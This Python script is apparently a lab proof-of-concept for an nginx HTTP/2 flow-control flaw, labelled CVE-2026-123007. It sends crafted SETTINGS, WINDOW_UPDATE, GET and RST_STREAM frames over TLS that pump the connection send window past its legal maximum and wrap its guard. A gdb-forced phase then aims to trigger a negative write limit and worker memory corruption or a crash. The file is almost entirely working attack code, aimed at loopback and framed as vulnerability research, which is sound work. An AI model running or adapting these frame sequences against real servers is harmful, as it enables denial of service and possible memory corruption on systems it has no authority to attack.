#!/usr/bin/env python3
"""Extreme connection-window consumer probe — CVE-2026-123007 lab harness.

Phases A-C are the wake-6 wuprobe sequence verbatim (SETTINGS stream window
MAX, connection WU W1, GET /blob, one charge->WU->RST interleave proof, 33
pump cycles to send_window = MAX + 32768, standalone WU to cross the wrapped
guard). Phase X then hands control to gdb: at the mkX0ping marker the worker
has h2c->send_window forced to 2^63 + 2^32 (lab/harness/gdb-x.cmd), the
value the wire path would reach after ~2^32 more max-size WUs (~120-170 GiB
of client traffic — the order of magnitude NGINX2Root claims for its full
--exploit). A fresh GET stream then runs ngx_http_v2_send_chain with that
ledger, where (off_t) h2c->send_window is negative and the queue-time limit
is expected to wrap: frame_size = (size_t) limit (filter:1165), a bogus
shadow buf with file_last < file_pos (filter:1313). Everything downstream is
observed: ASan/UBSan report, worker crash, GOAWAY, or clean error.

Debugger-assisted by design: the 2^63 ledger is FORCED, not wire-pumped; the
finding is labeled accordingly in the report. Loopback only (127.0.0.1).
"""

import json
import socket
import ssl
import struct
import sys
import time

HOST, PORT = "127.0.0.1", 8443
MAX_WINDOW = 0x7FFFFFFF
W1 = MAX_WINDOW - 65535          # -> connection send_window = MAX (pre-blob)
CHUNK = 65536                    # 8 DATA frames x 8192 charged per fresh stream
CYCLES = 33                      # pump until R = MAX + 32768 (observed)
BIG_WU = 0x7FFFFFFF              # phase C step 2: legal only after underflow
X_SID = 71                       # first stream id after the pump (5..69 used)
FORCED = 0x8000000100000000      # 2^63 + 2^32, set by gdb at the mkX0 marker

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

FT_DATA, FT_HEADERS, FT_SETTINGS, FT_RST = 0, 1, 4, 3
FT_PING, FT_GOAWAY, FT_WU = 6, 7, 8
FLAG_END_STREAM, FLAG_END_HEADERS, FLAG_ACK = 0x1, 0x4, 0x1
RST_CANCEL = 8


def frame(ftype, flags, sid, payload=b""):
    return len(payload).to_bytes(3, "big") + bytes([ftype, flags]) + \
        struct.pack(">I", sid) + payload


def window_update(sid, inc):
    return frame(FT_WU, 0, sid, struct.pack(">I", inc))


def rst(sid, status=RST_CANCEL):
    return frame(FT_RST, 0, sid, struct.pack(">I", status))


def ping(marker):
    assert len(marker) == 8
    return frame(FT_PING, 0, 0, marker)


def headers_block():
    return bytes([0x82, 0x87, 0x44, 5]) + b"/blob" + \
        bytes([0x41, 9]) + b"localhost"


def get_blob(sid):
    return frame(FT_HEADERS, FLAG_END_HEADERS | FLAG_END_STREAM, sid,
                 headers_block())


def summarize(buf):
    """Count DATA bytes / PONG markers / GOAWAY from a byte slice."""
    data_bytes, pongs, goaway = 0, [], None
    i = 0
    while i + 9 <= len(buf):
        length = int.from_bytes(buf[i:i + 3], "big")
        ftype, flags = buf[i + 3], buf[i + 4]
        sid = int.from_bytes(buf[i + 5:i + 9], "big") & 0x7FFFFFFF
        if i + 9 + length > len(buf):
            break
        if ftype == FT_DATA:
            data_bytes += length
        elif ftype == FT_PING and flags & FLAG_ACK:
            pongs.append(buf[i + 9:i + 9 + length].decode("latin1"))
        elif ftype == FT_GOAWAY and len(buf[i + 9:i + 9 + length]) >= 8 \
                and goaway is None:
            p = buf[i + 9:i + 9 + length]
            goaway = {"last_sid": int.from_bytes(p[0:4], "big") & 0x7FFFFFFF,
                      "error_code": int.from_bytes(p[4:8], "big")}
        i += 9 + length
    return data_bytes, pongs, goaway


def main():
    result = {
        "build": sys.argv[1] if len(sys.argv) > 1 else "?",
        "w1": W1, "chunk": CHUNK, "cycles": CYCLES, "big_wu": BIG_WU,
        "x_sid": X_SID, "forced": FORCED,
    }

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8192)
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    tls = ctx.wrap_socket(sock, server_hostname="localhost")

    settings = struct.pack(">HI", 0x4, MAX_WINDOW)   # INITIAL_WINDOW_SIZE
    tls.sendall(PREFACE + frame(FT_SETTINGS, 0, 0, settings)
                + window_update(0, W1) + get_blob(1))
    time.sleep(3)                                     # burst blocks socket
    tls.sendall(ping(b"mkA0ping"))                    # A0: MAX - blob_charge

    # ---- phase A: one interleave on stream 3 (mechanism proof) ----
    tls.sendall(get_blob(3))
    time.sleep(1.5)                                   # charge 65536
    tls.sendall(ping(b"mkA1ping"))
    tls.sendall(window_update(0, CHUNK))              # refill
    time.sleep(0.5)
    tls.sendall(ping(b"mkA2ping"))
    tls.sendall(rst(3))                               # refund on top of refill
    time.sleep(1.5)
    tls.sendall(ping(b"mkA3ping"))                    # A3: R = A2 + 65536

    # ---- phase B: pump CYCLES interleaves; R crosses MAX at cycle 33 ----
    for i in range(CYCLES):
        sid = 5 + 2 * i
        tls.sendall(get_blob(sid) + window_update(0, CHUNK) + rst(sid))
        if i % 10 == 9:
            time.sleep(0.3)
    time.sleep(2)
    tls.sendall(ping(b"mkB1ping"))                    # B1: expect MAX + 32768

    # ---- phase C: standalone WU while R > MAX -> guard wrap ----
    tls.sendall(window_update(0, CHUNK))
    time.sleep(1.0)
    tls.sendall(ping(b"mkC1ping"))
    tls.sendall(window_update(0, BIG_WU))             # 2^31-1 must be accepted
    time.sleep(1.0)
    tls.sendall(ping(b"mkC2ping"))                    # C2: post-BIG_WU state

    # ---- phase X: gdb forces h2c->send_window = 2^63 + 2^32 at mkX0 ----
    tls.sendall(ping(b"mkX0ping"))
    time.sleep(1.0)
    tls.sendall(ping(b"mkX1ping"))                    # X1: confirm forced value
    tls.sendall(get_blob(X_SID))                      # fresh send_chain
    time.sleep(2.0)
    tls.sendall(ping(b"mkX2ping"))                    # X2: after the trigger

    # ---- phase D: drain; watch for ASan/crash/GOAWAY/EOF ----
    tls.settimeout(0.3)
    buf, eof = b"", False
    end = time.time() + 10
    while time.time() < end:
        try:
            chunk = tls.recv(262144)
        except (socket.timeout, TimeoutError):
            continue
        if not chunk:
            eof = True
            break
        buf += chunk
    data_bytes, pongs, goaway = summarize(buf)
    result.update({
        "drain": {"bytes": data_bytes, "raw": len(buf), "eof": eof,
                  "pongs": pongs, "goaway": goaway},
        "markers": ["mkA0ping", "mkA1ping", "mkA2ping", "mkA3ping",
                    "mkB1ping", "mkC1ping", "mkC2ping", "mkX0ping",
                    "mkX1ping", "mkX2ping"],
        "sent_wu_total": W1 + CHUNK * (2 + CYCLES) + BIG_WU,
    })

    tls.close()
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
